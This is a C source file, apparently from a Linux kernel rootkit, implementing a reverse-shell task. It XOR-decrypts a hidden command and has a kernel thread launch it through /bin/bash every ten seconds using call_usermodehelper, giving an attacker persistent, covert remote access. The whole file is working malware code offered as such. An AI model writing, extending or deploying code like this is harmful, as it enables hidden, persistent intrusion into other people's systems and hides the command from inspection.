#include "tasks/reverse_shell.h"
#include "utils/encrypt_utils.h"


int rshell_func(void* data) {
    char xor_cmd[] = RSHELL_CMD_OBF;
    if (xor_cmd[0] == '\0') {
        return 0;
    }
    // reverse shell - initiate connections every 10[s]
    xor_decrypt(xor_cmd);
    char* argv[] = { "/bin/bash", "-c", xor_cmd, NULL };
    static char* envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
        while (!kthread_should_stop()) {
            call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
            ssleep(10);
        }
    return 0;
}
